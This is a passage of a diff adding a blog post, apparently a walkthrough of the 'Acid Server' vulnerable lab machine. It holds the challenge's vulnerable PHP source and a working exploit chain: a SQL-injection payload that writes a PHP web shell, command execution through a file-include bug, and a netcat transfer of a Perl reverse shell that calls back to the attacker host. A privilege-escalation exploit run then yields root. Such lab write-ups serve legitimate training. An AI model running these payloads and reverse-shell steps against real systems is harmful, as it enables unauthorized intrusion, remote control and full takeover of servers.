+</span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>sec_session_start<span class="o">()</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;protected_page&#39;</span><span class="o">]=</span><span class="nb">time</span><span class="o">()</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>?&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;!DOCTYPE html&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>    &lt;head&gt;
+</span><span class='line'>        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
+</span><span class='line'>      &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/style.css&quot;</span>&gt;
+</span><span class='line'>        &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;styles/main.css&quot;</span> /&gt;
+</span><span class='line'>        &lt;title&gt;Secure Login: Protected Page&lt;/title&gt;
+</span><span class='line'>    &lt;/head&gt;
+</span><span class='line'>    &lt;body&gt;
+</span><span class='line'>   &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;wrapper&quot;</span>&gt;
+</span><span class='line'>                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
+</span><span class='line'>              &lt;?php
+</span><span class='line'>          <span class="nv">$host</span> <span class="o">=</span> getenv<span class="o">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>          <span class="nv">$ref</span> <span class="o">=</span> getenv<span class="o">(</span><span class="s2">&quot;HTTP_REFERER&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>          <span class="nv">$ref1</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span>.<span class="s2">&quot;$host/Challenge/includes/process_login.php&quot;</span><span class="p">;</span>
+</span><span class='line'>          ?&gt;
+</span><span class='line'>
+</span><span class='line'>          &lt;?php <span class="k">if</span> <span class="o">(</span>login_check<span class="o">(</span><span class="nv">$mysqli</span><span class="o">)</span> <span class="o">==</span> <span class="nb">true</span><span class="o">)</span>: ?&gt;
+</span><span class='line'>
+</span><span class='line'>          &lt;p&gt;&lt;h1&gt; You have been logged into admin Panel Successfully.&lt;/h1&gt; &lt;br&gt;
+</span><span class='line'>          &lt;p&gt;&lt;h3&gt;You are close to your destination :-<span class="o">)</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;include.php&quot;</span>&gt;Click Here to Proceed Further&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
+</span><span class='line'>              &lt;p&gt;&lt;h3&gt;If you are <span class="k">done</span>, please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;includes/logout.php&quot;</span>&gt;log out&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>          &lt;?php elseif <span class="o">(</span><span class="nv">$ref</span> <span class="o">==</span> <span class="nv">$ref1</span><span class="o">)</span>: ?&gt;
+</span><span class='line'>              &lt;p&gt; &lt;h1&gt;Congrats..! You have bypassed User Panel Successfully.&lt;/h1&gt; &lt;br&gt;
+</span><span class='line'>              &lt;p&gt;&lt;h3&gt;There is long way to go :-<span class="o">)</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;hacked.php&quot;</span>&gt;Click Here to Proceed Further&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>              &lt;p&gt;&lt;h3&gt;If you are <span class="k">done</span>, please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;includes/logout.php&quot;</span>&gt;log out&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>          &lt;?php <span class="k">else</span>: ?&gt;
+</span><span class='line'>          &lt;p&gt;&lt;h1&gt;&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">&#39;Red&#39;</span>&gt;You are not authorized to access this page.&lt;/h1&gt;&lt;/font&gt;&lt;br&gt;&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">&#39;Green&#39;</span>&gt;Please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span>&gt;login&lt;/a&gt;&lt;/font&gt;&lt;/br&gt;.&lt;/p&gt;
+</span><span class='line'>          &lt;?php endif<span class="p">;</span> ?&gt;
+</span><span class='line'>    &lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Visit:
+<a href="http://192.168.2.102:33447/Challenge/hacked.php">http://192.168.2.102:33447/Challenge/hacked.php</a></p>
+
+<p><img class="center" src="/images/2015/1/image 9.png"></p>
+
+<p>source of hacked.php:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=hacked.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f <span class="m">1</span> <span class="p">|</span> base64 --decode
+</span><span class='line'>&lt;?php
+</span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
+</span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>sec_session_start<span class="o">()</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;protected_page&#39;</span><span class="o">])){</span>
+</span><span class='line'>  header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>  <span class="nb">exit</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;index_page&#39;</span><span class="o">])){</span>
+</span><span class='line'>  header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>  <span class="nb">exit</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;!DOCTYPE html&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>  &lt;head&gt;
+</span><span class='line'>      &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
+</span><span class='line'>      &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/style.css&quot;</span>&gt;
+</span><span class='line'>      &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;styles/main.css&quot;</span> /&gt;
+</span><span class='line'>      &lt;title&gt;Try to Extract Juicy details&lt;/title&gt;
+</span><span class='line'>  &lt;/head&gt;
+</span><span class='line'>  &lt;body&gt;
+</span><span class='line'>      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;wrapper&quot;</span>&gt;
+</span><span class='line'>                  &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
+</span><span class='line'>              &lt;?php
+</span><span class='line'>              <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;add&#39;</span><span class="o">]))</span>
+</span><span class='line'>              <span class="o">{</span>
+</span><span class='line'>              <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span><span class='line'>              <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+</span><span class='line'>              <span class="nv">$dbpass</span> <span class="o">=</span> <span class="s1">&#39;mehak&#39;</span><span class="p">;</span>
+</span><span class='line'>              <span class="nv">$conn</span> <span class="o">=</span> mysql_connect<span class="o">(</span><span class="nv">$dbhost</span>, <span class="nv">$dbuser</span>, <span class="nv">$dbpass</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">if</span><span class="o">(</span>! <span class="nv">$conn</span> <span class="o">)</span>
+</span><span class='line'>              <span class="o">{</span>
+</span><span class='line'>                      die<span class="o">(</span><span class="s1">&#39;Could not connect: &#39;</span> . mysql_error<span class="o">())</span><span class="p">;</span>
+</span><span class='line'>              <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>              <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'>              <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM members WHERE ID = ((&#39;$id&#39;))&quot;</span><span class="p">;</span>
+</span><span class='line'>              mysql_select_db<span class="o">(</span><span class="s1">&#39;secure_login&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>              <span class="nv">$retval</span> <span class="o">=</span> mysql_query<span class="o">(</span> <span class="nv">$sql</span>, <span class="nv">$conn</span> <span class="o">)</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">if</span><span class="o">(</span>! <span class="nv">$retval</span> <span class="o">)</span>
+</span><span class='line'>              <span class="o">{</span>
+</span><span class='line'>                      die<span class="o">(</span><span class="s1">&#39;Could not enter data: &#39;</span> . mysql_error<span class="o">())</span><span class="p">;</span>
+</span><span class='line'>              <span class="o">}</span>
+</span><span class='line'>                  <span class="nb">echo</span> <span class="s2">&quot;You have entered ID successfully...Which is not a big deal :D\n&quot;</span><span class="p">;</span>
+</span><span class='line'>              mysql_close<span class="o">(</span><span class="nv">$conn</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>              <span class="o">}</span>
+</span><span class='line'>              ?&gt;
+</span><span class='line'>                  &lt;p&gt; &lt;h1&gt;You are going Good...Show me your Ninja Skills.&lt;/h1&gt; &lt;br&gt;
+</span><span class='line'>              &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;get&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&lt;?php $_PHP_SELF ?&gt;&quot;</span>&gt;
+</span><span class='line'>              Enter your ID:&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nv">maxlength</span><span class="o">=</span><span class="s2">&quot;20&quot;</span>&gt;
+</span><span class='line'>              &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Add ID&quot;</span>&gt;
+</span><span class='line'>
+</span><span class='line'>              &lt;/body&gt;
+</span><span class='line'>              &lt;/html&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SQL Injection:
+The id parameter which is sent through the HTTP POST method  is the one that is used in the sql query executed by MySql DBMS.</p>
+
+<p>Payload</p>
+
+<p>id=&lsquo;)) UNION SELECT 1,&ldquo;&lt;?php system($_GET['cmd&rsquo;]); ?>&rdquo;,3,4,5 INTO OUTFILE &lsquo;/tmp/shell.php&rsquo;&ndash;</p>
+
+<p><img class="center" src="/images/2015/1/image 10.png"></p>
+
+<p>or cURL</p>
+
+<p>curl -s &ndash;cookie &ldquo;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&rdquo; &ndash;data &ldquo;id=&lsquo;)) UNION SELECT &rsquo;&lt;?php system(%24_GET[\&lsquo;cmd\&rsquo;]); ?>&lsquo;,2,3,4,5 INTO OUTFILE &rsquo;/tmp/shell.php'&ndash; -&rdquo; &ldquo;<a href="http://192.168.2.102:33447/Challenge/hacked.php?id=1&amp;add=Add+ID">http://192.168.2.102:33447/Challenge/hacked.php?id=1&amp;add=Add+ID</a>&rdquo;</p>
+
+<p>shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;id ;uname -a;pwd;which nc;which perl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
+</span><span class='line'>/var/www/html/Challenge
+</span><span class='line'>/bin/nc
+</span><span class='line'>/usr/bin/perl
+</span><span class='line'>  2   3   4   5
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interactive shell:</p>
+
+<p>I will use <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a> provided by <a href="http://pentestmonkey.net">pentestmonkey.net</a></p>
+
+<p>Wget isn&rsquo;t installed in the Acid so I used netcat to transfer the reverse shell:</p>
+
+<p>On our machine</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nvlp <span class="m">7777</span> &lt; revshell.pl
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On another terminal</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;nc 192.168.2.108 7777 &gt; revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Execute the reverse shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;perl revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
+</span><span class='line'>
+</span><span class='line'>Content-Length: 0
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-Type: text/html
+</span><span class='line'>
+</span><span class='line'>Content-Length: 44
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-Type: text/html
+</span><span class='line'>
+</span><span class='line'>Sent reverse shell to 192.168.2.108:4444&lt;p&gt;
+</span><span class='line'>  2   3   4   5
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nvlp 4444
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span><span class='line'>connect to <span class="o">[</span>192.168.2.108<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.102<span class="o">]</span> 39553
+</span><span class='line'> 23:13:11 up  1:33,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>/
+</span><span class='line'>/usr/sbin/apache: 0: can<span class="s1">&#39;t access tty; job control turned off</span>
+</span><span class='line'><span class="s1">$ python -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)</span><span class="err">&#39;</span>
+</span><span class='line'>www-data@acid:/<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>privilege Escalation</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>nc -nvlp <span class="m">7777</span> &lt; apport
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/tmp<span class="nv">$ </span>./apport
+</span><span class='line'>./apport
+</span><span class='line'>created /var/crash/_bin_sleep.33.crash
+</span><span class='line'>crasher: my pid is 1831
+</span><span class='line'>apport stopped, <span class="nv">pid</span> <span class="o">=</span> 1832
+</span><span class='line'>getting pid 1831
+</span><span class='line'>current <span class="nv">pid</span> <span class="o">=</span> 1830..2500..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..
+</span><span class='line'>** child: current <span class="nv">pid</span> <span class="o">=</span> 1831
+</span><span class='line'>** child: executing /bin/su
+</span><span class='line'>Password: sleeping 2s..
+</span><span class='line'>
+</span><span class='line'>checker: mode 4534
+</span><span class='line'>waiting <span class="k">for</span> file to be unlinked..writing to fifo
+</span><span class='line'>fifo written.. wait...
+</span><span class='line'>waiting <span class="k">for</span> /etc/sudoers.d/core to appear..
+</span><span class='line'>success
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'><span class="c"># python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>  ____                            _         _       _   _
+</span><span class='line'> / ___<span class="p">|</span>___  _ __   __ _ _ __ __ _<span class="p">|</span> <span class="p">|</span>_ _   _<span class="p">|</span> <span class="p">|</span> __ _<span class="p">|</span> <span class="p">|</span>_<span class="o">(</span>_<span class="o">)</span> ___  _ __  ___
+</span><span class='line'><span class="p">|</span> <span class="p">|</span>   / _ <span class="se">\|</span> <span class="s1">&#39;_ \ / _` | &#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span> __<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> __<span class="p">|</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\/</span> __<span class="p">|</span>
+</span><span class='line'><span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\</span>
+</span><span class='line'> <span class="se">\_</span>___<span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>___/
+</span><span class='line'>                  <span class="p">|</span>___/
+</span><span class='line'>root@acid:/tmp# <span class="nb">cd</span> /root
+</span><span class='line'><span class="nb">cd</span> /root
+</span><span class='line'>root@acid:~# ls
+</span><span class='line'>ls
+</span><span class='line'>flag.txt
+</span><span class='line'>root@acid:~# cat flag.txt
+</span><span class='line'>cat flag.txt
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Dear Hax0r,
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>You have successfully completed the challenge.
+</span><span class='line'>
+</span><span class='line'>I  hope you like it.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>FLAG NAME: <span class="s2">&quot;Acid@Makke@Hax0r&quot;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Kind <span class="p">&amp;</span> Best Regards
+</span><span class='line'>
+</span><span class='line'>-ACID
+</span><span class='line'>facebook: https://facebook.com/m.avinash143
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+  
+  
+
+
+    </article>
+  
   <div class="pagination">
     
     <a href="/blog/archives">Blog Archives</a>
@@ -89,15 +912,26 @@
 <aside class="sidebar">
   
     <section>
+<li class="post">
+<a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional"><img src="/images/oscp.png"  alt="Offensive Security Certified Professional"/> </a>
+</li>
+</section> 
+<section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
     
+      <li class="post">
+        <a href="/blog/2015/08/22/acid-server-1-walkthrough/">Acid Server: 1 Walkthrough</a>
+      </li>
+    
   </ul>
 </section>
-
-
-
-
+<section>
+    <h1>Twitter</h1>
+    <a class="twitter-timeline"  href="https://twitter.com/AE_Soos" data-widget-id="635449647071391748">Tweets by @AE_Soos</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+          
+</section>
 
   
 </aside>
